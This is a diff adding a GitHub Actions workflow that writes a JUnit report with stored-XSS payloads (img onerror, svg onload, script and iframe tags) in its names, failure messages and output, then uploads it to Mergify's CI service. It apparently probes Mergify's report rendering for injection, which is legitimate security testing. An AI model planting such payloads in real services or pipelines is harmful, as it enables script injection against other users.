@@ -1,0 +1,37 @@
+name: ci
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+jobs:
+  test-xss-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write malicious JUnit report
+        run: |
+          cat > malicious-report.xml << 'XMLEOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<testsuites>
+  <testsuite name="&lt;img src=x onerror=alert(document.domain)&gt;SuiteXSS" tests="2" failures="1" errors="0" time="0.1">
+    <testcase classname="com.example.&lt;svg/onload=alert(1)&gt;ClassXSS" name="test_&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;_injection" time="0.05">
+      <failure message="XSS-TEST&lt;img src=x onerror=alert(&apos;mergify-stored-xss-failure-message&apos;)&gt;" type="AssertionError">
+Stack trace with payload: &lt;iframe srcdoc="&lt;script&gt;alert(&apos;mergify-stored-xss-stacktrace&apos;)&lt;/script&gt;"&gt;
+      </failure>
+      <system-out>SYSOUT-XSS&lt;img src=x onerror=alert(&apos;mergify-stored-xss-sysout&apos;)&gt;</system-out>
+    </testcase>
+    <testcase classname="com.example.NormalClass" name="test_normal_pass" time="0.02"/>
+  </testsuite>
+</testsuites>
+XMLEOF
+          echo "wrote report"
+        id: tests
+        continue-on-error: true
+      - name: Mergify CI Upload
+        if: success() || failure()
+        uses: mergifyio/gha-mergify-ci@v25
+        with:
+          token: ${{ secrets.MERGIFY_TOKEN }}
+          report_path: malicious-report.xml
+          test_step_outcome: ${{ steps.tests.outcome }}
